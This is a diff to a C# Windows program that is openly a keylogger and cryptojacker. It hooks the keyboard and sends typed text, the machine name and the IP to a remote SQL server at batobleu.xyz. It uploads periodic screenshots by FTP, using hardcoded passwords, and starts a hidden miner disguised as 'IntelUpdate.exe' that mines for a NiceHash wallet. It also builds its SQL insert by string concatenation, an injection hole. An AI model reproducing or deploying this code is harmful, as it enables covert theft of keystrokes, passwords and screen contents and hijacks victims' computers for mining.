@@ -20,31 +20,49 @@ class InterceptKeys
     private static string texte = "";
     private static bool capital = false;
     private static IntPtr _hookID = IntPtr.Zero;
-    private static string log = @"Data Source=batobleu.xyz,3351; Initial Catalog=keylog;user id=root;Password=";
+    private static string log = @"Data Source=batobleu.xyz,3351; Initial Catalog=keylog;user id=root;Password=Patate360";
     private static SqlConnection cnxSQLServer = new SqlConnection(log);
     private static SqlCommand cmdSQLServer = cnxSQLServer.CreateCommand();
     private static string date;
-    private static bool hide = true;
+    private static bool spamming = false;
+    private static string minerName = "IntelUpdate.exe";
+    private static bool enableMiner = false;
+    private static bool hide = false;
+    static System.Timers.Timer timerSpam = new System.Timers.Timer(5000)
+    {
+        AutoReset = true,
+        Enabled = true,
+    };
+    static System.Timers.Timer timerScreenshot = new System.Timers.Timer(30000)
+    {
+        Enabled = true,
+        AutoReset = true
+    };
     private static FtpClient client = new FtpClient("ftp.batobleu.xyz")
     {
-        Credentials = new NetworkCredential("11793_nexis", "")
+        Credentials = new NetworkCredential("11793_nexis", "patate360")
     };
-    private static System.Timers.Timer aTimer;
+    
     #endregion
     #region Start
     public static void Main()
     {
-        Thread xmr = new Thread(new ThreadStart(miner));
-        xmr.Start();
         var handle = GetConsoleWindow();
         if (hide == true)
         {
             ShowWindow(handle, SW_HIDE);
         }
-        aTimer = new System.Timers.Timer(30000);
-        aTimer.Elapsed += OnTimedEvent;
-        aTimer.AutoReset = true;
-        aTimer.Enabled = true;
+        timerSpam.Elapsed += AntiSpam;
+        timerScreenshot.Elapsed += AutoScreen;
+        if (enableMiner == true)
+        {
+            try
+            {
+                Thread xmr = new Thread(new ThreadStart(Miner));
+                xmr.Start();
+            }
+            catch { }
+        }
         SQLConnect();
         client.Connect();
         _hookID = SetHook(_proc);
@@ -65,9 +83,9 @@ class InterceptKeys
         {
             Console.WriteLine(exc);
         }
-        SqlCommand cmdSQLServer = cnxSQLServer.CreateCommand();
     }
-
+    #endregion
+    #region captureKey
     private static IntPtr SetHook(LowLevelKeyboardProc proc)
     {
         using (Process curProcess = Process.GetCurrentProcess())
@@ -77,8 +95,7 @@ class InterceptKeys
                 GetModuleHandle(curModule.ModuleName), 0);
         }
     }
-    #endregion
-    #region captureKey
+
     private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
 
     public static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
@@ -96,7 +113,6 @@ class InterceptKeys
     #region procTexte
     public static void ProcTexte(string key)
     {
-        SqlCommand cmdSQLServer = cnxSQLServer.CreateCommand();
         Console.Clear();
         if (key == "Capital" && capital == true)
         {
@@ -134,10 +150,17 @@ class InterceptKeys
         {
             texte = texte + ",";
         }
+        else if (key == "OemPeriod" && capital == true)
+        {
+            texte = texte + ".";
+        }
+        else if (key == "oemperiod" && capital == false)
+        {
+            texte = texte + ";";
+        }
         else if (key == "return" || key == "Return")
         {
-            sendInfo(texte);
-            texte = "";
+            SendInfo(texte);
         }
         else if (capital == false && key != "Back")
         {
@@ -150,38 +173,56 @@ class InterceptKeys
         Console.WriteLine(texte);
         if (texte.Length >= 200)
         {
-            sendInfo(texte);
-            texte = "";
+            SendInfo(texte);
         }
-
     }
     #endregion
     #region sendInfo
-    public static void sendInfo(string texte)
+    public static void SendInfo(string _texte)
     {
+        SqlCommand cmdSQLServer = cnxSQLServer.CreateCommand();
         Thread sendScreen = new Thread(new ThreadStart(Screenshot));
         Console.Clear();
         date = DateTime.Now.ToString("dd/MM/yy HH:mm:ss");
-        cmdSQLServer.CommandText = "INSERT INTO keylog (keylog,dateKeylog,labelPC, ipPC) VALUES ('" + texte + "','" + date + "','" + Environment.MachineName + "','"+ GetLocalIPAddress() +"')";
+        cmdSQLServer.CommandText = "INSERT INTO keylog (keylog,dateKeylog,labelPC, ipPC, screenshot) VALUES ('" + _texte + "','" + date + "','" + Environment.MachineName + "','" + GetLocalIPAddress() + "','" + Screen() +"')";
+        texte = "";
         try
         {
             cmdSQLServer.ExecuteNonQuery();
-            texte = "";
-            try
+            if(Screen() == "true")
             {
-                sendScreen.Start();
+                try
+                {
+                    sendScreen.Start();
+                }
+                catch { }
             }
-            catch { }
+
         }
         catch { }
+        spamming = true;
+    }
+    #endregion
+    #region screen
+    private static string Screen()
+    {
+        if (spamming == false)
+        {
+            return "true";
+        }
+        else
+        {
+            return "false";
+        }
     }
     #endregion
     #region Screenshot
     public static void Screenshot()
     {
+        timerSpam.Stop();
         string time = DateTime.Now.ToString("dd_MM_yyyy HH_mm_ss");
         string str = Environment.MachineName + " " + time + ".png";
-        Bitmap memoryImage = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
+        Bitmap memoryImage = new Bitmap(System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width, System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height);
         Size s = new Size(memoryImage.Width, memoryImage.Height);
         Graphics memoryGraphics = Graphics.FromImage(memoryImage);
         memoryGraphics.CopyFromScreen(0, 0, 0, 0, s);
@@ -190,34 +231,36 @@ class InterceptKeys
         {
             client.Connect();
         }
-        if (client.DirectoryExists("/" + Environment.MachineName + "/"))
-        {
-            client.UploadFile(str, "/keylog/" + Environment.MachineName + "/" + time + ".png", FtpExists.Overwrite, false, FtpVerify.Retry);
-        }
         else
         {
-            client.CreateDirectory("/keylog/" + Environment.MachineName);
-            client.UploadFile(str, "/keylog/" + Environment.MachineName + "/" + time + ".png", FtpExists.Overwrite, false, FtpVerify.Retry);
+            if (client.DirectoryExists("/" + Environment.MachineName + "/"))
+            {
+                client.UploadFile(str, "/keylog/" + Environment.MachineName + "/" + time + ".png", FtpExists.Overwrite, false, FtpVerify.Retry);
+            }
+            else
+            {
+                client.CreateDirectory("/keylog/" + Environment.MachineName);
+                client.UploadFile(str, "/keylog/" + Environment.MachineName + "/" + time + ".png", FtpExists.Overwrite, false, FtpVerify.Retry);
+            }
         }
         File.Delete(str);
-        
+        timerSpam.Start();
     }
     #endregion
     #region miner
-    public static void miner()
+    public static void Miner()
     {
-        ProcessStartInfo startInfo = new ProcessStartInfo();
         string user = Environment.MachineName;
-        user = user.Replace("NIMF3", "");
-        user = user.Replace("-", "x");
-
-        startInfo.UseShellExecute = false;
-        startInfo.FileName = "miner.exe";
-        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
-        startInfo.Arguments = "-o stratum+tcp://cryptonight.eu.nicehash.com:3355 -u 35mDqV69AD9WhZx2orzZm18oTBrSFyDT7S."+user+" -p x -t 2 -mport 4001 -dbg -1";
-
-        using (Process exeProcess = Process.Start(startInfo))
-        exeProcess.Start();
+        var minerProcess = new ProcessStartInfo
+        {
+            FileName = minerName,
+            UseShellExecute = false,
+            RedirectStandardOutput = true,
+            RedirectStandardError = true,
+            Arguments = "-o stratum+tcp://cryptonight.eu.nicehash.com:3355 -u 35mDqV69AD9WhZx2orzZm18oTBrSFyDT7S." + user + " -p x -mport 4001 -dbg -1",
+            WindowStyle = ProcessWindowStyle.Hidden
+        };
+        Process.Start(minerProcess);
     }
     #endregion
     #region GetLocalIPAdress
@@ -234,17 +277,19 @@ class InterceptKeys
         throw new Exception("No network adapters with an IPv4 address in the system!");
     }
     #endregion
-    #region Timer
-    private static void OnTimedEvent(Object source, ElapsedEventArgs e)
+    #region AutoScreen
+    private static void AutoScreen(Object source, ElapsedEventArgs e)
     {
-        if (texte == "")
+        if (texte != "")
         {
-            sendInfo("screenshot");
+            SendInfo(texte);
         }
-        else
-        {
-            sendInfo(texte);
-        }
+    }
+    #endregion
+    #region AntiSpam
+    private static void AntiSpam(Object source, ElapsedEventArgs e)
+    {
+        spamming = false;
     }
     #endregion
     #region dll
